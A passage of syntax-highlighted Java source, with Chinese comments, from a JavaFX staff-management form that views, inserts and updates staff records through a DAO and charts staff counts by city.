        viewBtn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"View"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        insertBtn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Insert"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        updateBtn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Update"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        clearBtn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Clear"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        showChartBtn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Show Charts"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        controlBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>viewBtn<span class="token punctuation">,</span> insertBtn<span class="token punctuation">,</span> updateBtn<span class="token punctuation">,</span> clearBtn<span class="token punctuation">,</span> showChartBtn<span class="token punctuation">)</span><span class="token punctuation">;</span>
        vBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>controlBox<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 设置事件处理</span>
        <span class="token function">setupEventHandlers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">setupEventHandlers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        viewBtn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>event <span class="token operator">-&gt;</span> <span class="token function">viewStaff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        insertBtn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>event <span class="token operator">-&gt;</span> <span class="token function">insertStaff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        updateBtn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>event <span class="token operator">-&gt;</span> <span class="token function">updateStaff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        clearBtn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>event <span class="token operator">-&gt;</span> <span class="token function">clearFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        showChartBtn<span class="token punctuation">.</span><span class="token function">setOnAction</span><span class="token punctuation">(</span>event <span class="token operator">-&gt;</span> <span class="token function">showCharts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">viewStaff</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> id <span class="token operator">=</span> idField<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">Staff</span> staff <span class="token operator">=</span> staffDao<span class="token punctuation">.</span><span class="token function">findStaffById</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>staff <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">updateUIWithStaffInfo</span><span class="token punctuation">(</span>staff<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token function">clearFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// 显示员工不存在的消息</span>
                <span class="token function">showAlert</span><span class="token punctuation">(</span><span class="token string">"No Record Found"</span><span class="token punctuation">,</span> <span class="token string">"No staff record found with ID: "</span> <span class="token operator">+</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SQLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 显示数据库错误消息</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">insertStaff</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Staff</span> staff <span class="token operator">=</span> <span class="token function">createStaffFromFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>staff <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token comment">// 校验失败</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">int</span> result <span class="token operator">=</span> staffDao<span class="token punctuation">.</span><span class="token function">insertStaff</span><span class="token punctuation">(</span>staff<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>result <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">showAlert</span><span class="token punctuation">(</span><span class="token string">"Success"</span><span class="token punctuation">,</span> <span class="token string">"Staff inserted successfully!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token function">showAlert</span><span class="token punctuation">(</span><span class="token string">"Failed"</span><span class="token punctuation">,</span> <span class="token string">"Failed to insert staff."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SQLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 显示数据库错误消息</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">updateStaff</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Staff</span> staff <span class="token operator">=</span> <span class="token function">createStaffFromFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>staff <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token comment">// 校验失败</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">int</span> result <span class="token operator">=</span> staffDao<span class="token punctuation">.</span><span class="token function">updateStaff</span><span class="token punctuation">(</span>staff<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>result <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">showAlert</span><span class="token punctuation">(</span><span class="token string">"Success"</span><span class="token punctuation">,</span> <span class="token string">"Staff updated successfully!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token function">showAlert</span><span class="token punctuation">(</span><span class="token string">"Failed"</span><span class="token punctuation">,</span> <span class="token string">"Failed to update staff."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SQLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 显示数据库错误消息</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">clearFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 清空所有文本字段</span>
        idField<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        lastNameField<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        firstNameField<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        miField<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        addressField<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cityField<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        stateField<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        telephoneField<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        emailField<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token class-name">Staff</span> <span class="token function">createStaffFromFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> id <span class="token operator">=</span> idField<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> lastName <span class="token operator">=</span> lastNameField<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> firstName <span class="token operator">=</span> firstNameField<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> mi <span class="token operator">=</span> miField<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> address <span class="token operator">=</span> addressField<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> city <span class="token operator">=</span> cityField<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> state <span class="token operator">=</span> stateField<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> telephone <span class="token operator">=</span> telephoneField<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> email <span class="token operator">=</span> emailField<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 输入验证</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>id<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> lastName<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> firstName<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> address<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> city<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token operator">||</span> state<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> telephone<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> email<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">showAlert</span><span class="token punctuation">(</span><span class="token string">"Input Error"</span><span class="token punctuation">,</span> <span class="token string">"All fields must be filled out."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// 创建Staff对象</span>
        <span class="token class-name">Staff</span> staff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Staff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        staff<span class="token punctuation">.</span><span class="token function">setId</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>
        staff<span class="token punctuation">.</span><span class="token function">setLastName</span><span class="token punctuation">(</span>lastName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        staff<span class="token punctuation">.</span><span class="token function">setFirstName</span><span class="token punctuation">(</span>firstName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        staff<span class="token punctuation">.</span><span class="token function">setMi</span><span class="token punctuation">(</span>mi<span class="token punctuation">)</span><span class="token punctuation">;</span>
        staff<span class="token punctuation">.</span><span class="token function">setAddress</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>
        staff<span class="token punctuation">.</span><span class="token function">setCity</span><span class="token punctuation">(</span>city<span class="token punctuation">)</span><span class="token punctuation">;</span>
        staff<span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">;</span>
        staff<span class="token punctuation">.</span><span class="token function">setTelephone</span><span class="token punctuation">(</span>telephone<span class="token punctuation">)</span><span class="token punctuation">;</span>
        staff<span class="token punctuation">.</span><span class="token function">setEmail</span><span class="token punctuation">(</span>email<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> staff<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">updateUIWithStaffInfo</span><span class="token punctuation">(</span><span class="token class-name">Staff</span> staff<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>staff <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>

        idField<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        lastNameField<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">getLastName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        firstNameField<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">getFirstName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        miField<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">getMi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        addressField<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">getAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cityField<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">getCity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        stateField<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        telephoneField<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">getTelephone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        emailField<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span>staff<span class="token punctuation">.</span><span class="token function">getEmail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">showCharts</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Staff</span><span class="token punctuation">&gt;</span></span> staffList <span class="token operator">=</span> staffDao<span class="token punctuation">.</span><span class="token function">findAllStaff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> cityCount <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Staff</span> staff <span class="token operator">:</span> staffList<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">String</span> city <span class="token operator">=</span> staff<span class="token punctuation">.</span><span class="token function">getCity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                cityCount<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>city<span class="token punctuation">,</span> cityCount<span class="token punctuation">.</span><span class="token function">getOrDefault</span><span class="token punctuation">(</span>city<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token function">showPieChart</span><span class="token punctuation">(</span>cityCount<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">showBarChart</span><span class="token punctuation">(</span>cityCount<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SQLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 显示数据库错误消息</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">showPieChart</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> cityCount<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Stage</span> chartStage <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">VBox</span> chartBox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">PieChart<span class="token punctuation">.</span>Data</span><span class="token punctuation">&gt;</span></span> pieChartDataList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> entry <span class="token operator">:</span> cityCount<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            pieChartDataList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PieChart<span class="token punctuation">.</span>Data</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token class-name">ObservableList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">PieChart<span class="token punctuation">.</span>Data</span><span class="token punctuation">&gt;</span></span> dataObservableList <span class="token operator">=</span> <span class="token class-name">FXCollections</span><span class="token punctuation">.</span><span class="token function">observableArrayList</span><span class="token punctuation">(</span>pieChartDataList<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">PieChart</span> pieChart <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PieChart</span><span class="token punctuation">(</span>dataObservableList<span class="token punctuation">)</span><span class="token punctuation">;</span>
        pieChart<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"City Count"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        chartBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pieChart<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>chartBox<span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        chartStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        chartStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"Pie Chart"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        chartStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">showBarChart</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> cityCount<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Stage</span> chartStage <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">VBox</span> chartBox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VBox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">CategoryAxis</span> xAxis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CategoryAxis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">NumberAxis</span> yAxis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NumberAxis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">BarChart</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Number</span><span class="token punctuation">&gt;</span></span> barChart <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BarChart</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span>xAxis<span class="token punctuation">,</span> yAxis<span class="token punctuation">)</span><span class="token punctuation">;</span>
        xAxis<span class="token punctuation">.</span><span class="token function">setLabel</span><span class="token punctuation">(</span><span class="token string">"City"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        yAxis<span class="token punctuation">.</span><span class="token function">setLabel</span><span class="token punctuation">(</span><span class="token string">"Count"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">XYChart<span class="token punctuation">.</span>Series</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Number</span><span class="token punctuation">&gt;</span></span> series <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XYChart<span class="token punctuation">.</span>Series</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> entry <span class="token operator">:</span> cityCount<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            series<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">XYChart<span class="token punctuation">.</span>Data</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        barChart<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>series<span class="token punctuation">)</span><span class="token punctuation">;</span>

